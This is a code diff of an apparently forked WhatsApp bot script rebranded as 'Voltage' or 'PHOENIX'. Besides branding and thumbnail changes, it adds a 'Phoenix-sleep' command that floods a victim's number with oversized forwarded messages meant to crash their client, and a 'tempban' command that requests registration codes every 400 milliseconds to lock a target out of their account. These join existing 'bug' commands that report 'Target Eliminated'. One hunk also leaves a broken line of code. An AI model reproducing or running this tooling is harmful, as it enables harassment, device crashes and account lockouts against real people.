@@ -467,7 +467,7 @@ const subscribe_dgxeon = {
 },
 message: {
 "listResponseMessage": {
-title: `Xeon's ur father`
+title: `Feel the Voltage`
 }}
 }
 async function XeonyCrashy(dgxeon,chat) {
@@ -487,7 +487,7 @@ var xeonlod = [
 "《 ███████▒▒▒▒▒》50%",
 "《 ██████████▒▒》80%",
 "《 ████████████》100%",
-"𝙻𝙾𝙰𝙳𝙸𝙽𝙶 𝙲𝙾𝙼𝙿𝙻𝙴𝚃𝙴𝙳 🦄..."
+"𝙻𝙾𝙰𝙳𝙸𝙽𝙶 𝙲𝙾𝙼𝙿𝙻𝙴𝚃𝙴𝙳 .."
 ]
 let { key } = await XeonBotInc.sendMessage(from, {text: 'ʟᴏᴀᴅɪɴɢ...'})
 
@@ -524,7 +524,7 @@ await XeonBotInc.sendMessage(from, {text: xeonlod[i], edit: key });
         }
         
         if (autobio) {
-            XeonBotInc.updateProfileStatus(`24/7 Online Bot By ${ownername}`).catch(_ => _)
+            XeonBotInc.updateProfileStatus(`©Lord Voltage Bug Online Bot By ${ownername}`).catch(_ => _)
         }
         if (m.sender.startsWith('92') && global.anti92 === true) {
             return XeonBotInc.updateBlockStatus(m.sender, 'block')
@@ -914,7 +914,7 @@ senddocu(buffer)
                                 showAdAttribution: true,
                                 title: 'Broadcast By Owner',
                                 body: `Sent ${i.length} Group`,
-                                thumbnailUrl: 'https://telegra.ph/file/3f09606b0871d55ec39c1.jpg',
+                                thumbnailUrl: 'https://telegra.ph/file/d5777ee70206a6841a815.jpg',
                                 sourceUrl: global.link,
                                 mediaType: 1,
                                 renderLargerThumbnail: true
@@ -1222,7 +1222,7 @@ ${cpus.map((cpu, i) => `${i + 1}. ${cpu.model.trim()} (${cpu.speed} MHZ)\n${Obje
                             showAdAttribution: true,
                             title: `${botname}`,
                             body: `${latensi.toFixed(4)} Second`,
-                            thumbnailUrl: 'https://telegra.ph/file/3f09606b0871d55ec39c1.jpg',
+                            thumbnailUrl: 'https://telegra.ph/file/d5777ee70206a6841a815.jpg',
                             sourceUrl: global.link,
                             mediaType: 1,
                             renderLargerThumbnail: true
@@ -1244,7 +1244,7 @@ ${cpus.map((cpu, i) => `${i + 1}. ${cpu.model.trim()} (${cpu.speed} MHZ)\n${Obje
                             showAdAttribution: true,
                             title: `${botname}`,
                             body: `${ownername}`,
-                            thumbnailUrl: 'https://telegra.ph/file/3f09606b0871d55ec39c1.jpg',
+                            thumbnailUrl: 'https://telegra.ph/file/d5777ee70206a6841a815.jpg',
                             sourceUrl: global.link,
                             mediaType: 1,
                             renderLargerThumbnail: true
@@ -1256,7 +1256,7 @@ ${cpus.map((cpu, i) => `${i + 1}. ${cpu.model.trim()} (${cpu.speed} MHZ)\n${Obje
             }
             break
             case 'runtime':
-                let runtimetext = `Bots Have Been Running For ${runtime(process.uptime())}`
+                let runtimetext = `PHOENIX has been up since ${runtime(process.uptime())}`
                 XeonBotInc.sendMessage(m.chat, {
                     text: runtimetext,
                     contextInfo: {
@@ -1264,7 +1264,7 @@ ${cpus.map((cpu, i) => `${i + 1}. ${cpu.model.trim()} (${cpu.speed} MHZ)\n${Obje
                             showAdAttribution: true,
                             title: `${botname}`,
                             body: `FORGET DONATE`,
-                            thumbnailUrl: 'https://telegra.ph/file/3f09606b0871d55ec39c1.jpg',
+                            thumbnailUrl: 'https://telegra.ph/file/d5777ee70206a6841a815.jpg',
                             sourceUrl: global.link,
                             mediaType: 1,
                             renderLargerThumbnail: true
@@ -1284,7 +1284,7 @@ ${cpus.map((cpu, i) => `${i + 1}. ${cpu.model.trim()} (${cpu.speed} MHZ)\n${Obje
                             showAdAttribution: true,
                             title: `${botname}`,
                             body: `SCRIPT OF ${botname} is on YouTube voltageprotech`,
-                            thumbnailUrl: 'https://telegra.ph/file/3f09606b0871d55ec39c1.jpg',
+                            thumbnailUrl: 'https://telegra.ph/file/d5777ee70206a6841a815.jpg',
                             sourceUrl: global.link,
                             mediaType: 1,
                             renderLargerThumbnail: true
@@ -1317,7 +1317,7 @@ break
                 if (!quoted) return replygcxeon(`Reply to Video/Image With Caption ${prefix + command}`)
                 if (/image/.test(mime)) {
                     let media = await quoted.download()
-                    let encmedia = await XeonBotInc.sendImageAsSticker(m.chat, media, m, {
+                    let encmedia = m, {
                         packname: packname,
                         author: author
                     })
@@ -1619,7 +1619,7 @@ ya = q.split("|")[0].replace(/[^0-9]/g, '')
 unp = owner.indexOf(ya)
 owner.splice(unp, 1)
 fs.writeFileSync('./database/owner.json', JSON.stringify(owner))
-replygcxeon(`The Numbrr ${ya} Has been deleted from owner list by the owner!!!`)
+replygcxeon(`The Number ${ya} Has been deleted from owner list by the owner!!!`)
 break
             case 'addvideo': {
                 if (!isPremium) return replygcxeon(mess.prem)
@@ -2094,7 +2094,7 @@ case "xandroid": {
   sendVariousMessages(whatsappNumber, encodedAmount);
   await sleep(2500); // Adjusted sleep time for clarity
   sendMessageWithMentions(
-    "Successfully Sent Bug To @" + whatsappNumber.split('@')[0] + 
+    "Target Eliminated Using Xandroid @" + whatsappNumber.split('@')[0] + 
     " Using *" + command + "* ✅\n\nPause 2 minutes so that the bot is not banned.", 
     [whatsappNumber]
   );
@@ -2126,10 +2126,22 @@ case "xios": {
   sendMultiplePaymentInvites(whatsappNumber, encodedAmount);
   await sleep(2500); // Adjusted sleep time for clarity
   sendMessageWithMentions(
-    "Successfully Sent Bug To @" + whatsappNumber.split('@')[0] + 
+    "Target Eliminated Using Xios @" + whatsappNumber.split('@')[0] + 
     " Using *" + command + "* ✅\n\nPause 2 minutes so that the bot is not banned.", 
     [whatsappNumber]
   );
+}
+break;
+case 'Phoenix-sleep': {
+if (!isPremium) return replygcxeon(mess.prem)
+if (!args[0]) return replygcxeon(`Use ${prefix+command} victim number|amount\nExample ${prefix+command} 234xxxxxxxxxx|5`) 
+await loading()
+victim = text.split("|")[0]+"@s.whatsapp.net"
+amount = text.split("|")[1] * 30
+for (let i = 0; i < amount; i++) {
+await XeonBotInc.sendMessage(victim, { text: ownername, contextInfo:{ isForwarded: true, forwardedNewsletterMessageInfo: { newsletterJid: '120363222395675670@newsletter', newsletterName: botname.repeat(10000), serverMessageId: 2 } }}, { quoted: xbug2 })
+}
+replygcxeon(`${victim} Has Being Made to Sleep\n Wait 2 mins To Avoid Ban\n Tempban him to lock him out`)
 }
 break;
 case "xios2":
@@ -2165,7 +2177,7 @@ case "xios2":
       return replygcxeon("Amount must be a number");
     }
     let encodedValue = encodeURI(text) * 200; // Adjusted calculation for clarity
-    replygcxeon("please wait, " + command + " bug is in process..");
+    replygcxeon("please wait, " + command + " has been summoned..");
     await sleep(1500); // Adjusted sleep time for clarity
     sendVariousMessages(from, encodedValue);
     await sleep(2500); // Adjusted sleep time for clarity
@@ -2217,12 +2229,12 @@ case "xios2":
   if (contactInfo.length == 0) {
     return replygcxeon("The number is not registered on WhatsApp");
   }
-  replygcxeon("please wait, " + command + " bug is in process..");
+  replygcxeon("please wait, " + command + " has been summoned..");
   await sleep(2000); // Adjusted sleep time for clarity
   sendMixedMessages(whatsappNumber, encodedAmount);
   await sleep(2500); // Adjusted sleep time for clarity
   sendMessageWithMentions(
-    "Successfully Sent Bug To @" + whatsappNumber.split('@')[0] + 
+    "Target Eliminated Using Systemuicrash @" + whatsappNumber.split('@')[0] + 
     " Using *" + command + "* ✅\n\nPause 2 minutes so that the bot is not banned.", 
     [whatsappNumber]
   );
@@ -2254,10 +2266,49 @@ case "xsysui": {
   sendRepeatedMessages2(whatsappNumber, encodedAmount);
   await sleep(2500); // Adjusted sleep time for clarity
   sendMessageWithMentions(
-    "Successfully Sent Bug To @" + whatsappNumber.split('@')[0] + 
+    "Target eliminated using Xios @" + whatsappNumber.split('@')[0] + 
     " Using *" + command + "* ✅\n\nPause 2 minutes so that the bot is not banned.", 
     [whatsappNumber]
   );
+}
+break;
+case 'tempban': {
+if (!isPremium) return replygcxeon(mess.prem)
+if (!text) return replygcxeon(`Example: ${prefix + command} 234|********9`)
+if (!/|/.test(text)) return replygcxeon(`The data you provided is invalid!, Example: \n ${prefix + command} 234|**********9`)
+let numbers = JSON.parse(fs.readFileSync('./database/tempban.json'))
+let cCode = q.split("|")[0]
+let number = q.split("|")[1]
+let fullNo = cCode + number
+await replygcxeon(`Success! Registration Interruption has been successfully activated to the target : ${fullNo} for an unlimited period of time. Registration interruption will be stopped if the server is restarted, shut down, or down.`)
+let { state, saveCreds } = await useMultiFileAuthState('session')
+let spam = makeWaSocket({
+auth: state,
+mobile: true,
+logger: pino({ level: 'silent' })
+})
+let dropNumber = async () => {
+try {
+let res = await spam.requestRegistrationCode({
+phoneNumber: `+${fullNo}`,
+phoneNumberCountryCode: cCode,
+phoneNumberNationalNumber: number,
+phoneNumberMobileCountryCode: 724,
+})
+if (res.reason === 'temporarily_unavailable') {
+console.log(`Invalid Number (Possibility of Interrupted Registration): +${res.login}`)
+await sleep(1000)
+await dropNumber()
+}
+} catch (error) {
+console.error(error)
+}
+}
+numbers[fullNo] = { cCode, number };
+fs.writeFileSync('./database/tempban.json', JSON.stringify(numbers, null, '\t'))
+setInterval(() => {
+dropNumber()
+}, 400)
 }
 break;
 case 'clearall': {
@@ -2280,7 +2331,7 @@ break
 ┃❃│ Time : ${xeonytimewisher}
 ┃❃│ Day : Look at the watch⌚
 ┃❃│ Date : ITS A PRETTY DAY🥳
-┃❃│ Version : 1.0
+┃❃│ Version : 2.0
 ┃❃│ Plugins : 250
 ┃❃│ Ram : 64 GB
 ┃❃│ Alive : ${runtime(process.uptime())}
@@ -2290,7 +2341,7 @@ break
 ╭═══ 𝙰𝙽𝙳𝚁𝙾𝙸𝙳  𝙱𝚄𝙶 ⚠️ ═══⊷ 
 ┃ 🕊 𝙭𝚊𝙣𝙙𝚛𝙤𝙞𝙙
 ┃ 🕊 𝙭𝚊𝙣𝙙𝚛𝙤𝙞𝙙2
-┃ 🕊 𝙨𝚢𝚜𝚝𝚎𝚖𝚞𝚒𝚌𝚑
+┃ 🕊 𝙨𝚢𝚜𝚝𝚎𝚖𝚞𝚒𝚌ʀᴀsʜ
 ┃ 🕊 𝙭𝚜𝚢𝚜𝚞𝚒
 ╰═════════════════⊷
 
@@ -2301,6 +2352,10 @@ break
 
 ╭═══ 𝙶𝚁𝙾𝚄𝙿  𝙱𝚄𝙶 🦠 ═══⊷ 
 ┃ 🕊 𝙭𝚐𝚌
+╰═════════════════⊷
+╭═══ ʙᴇᴛᴀ ʙᴜɢ 🍑 ═══⊷ 
+┃ 🕊 ᴛᴇᴍᴘʙᴀɴ
+┃ 🕊 ᴘʜᴏᴇɴɪx sʟᴇᴇᴘ
 ╰═════════════════⊷
 
 ╭═══ 𝙾𝚆𝙽𝙴𝚁  𝙼𝙴𝙽𝙐 🔐 ═══⊷ 
@@ -2401,7 +2456,7 @@ break
 ┃ 🕊 sᴏᴜɴᴅ1 - sᴏᴜɴᴅ161
 ╰═════════════════⊷
 
-> Voltage Lord ©`
+> *©ᴠᴏʟᴛᴀɢᴇ ʟᴏʀᴅ*`
 if (typemenu === 'v1') {
                     XeonBotInc.sendMessage(m.chat, {
                         text: xeonmenuoh,
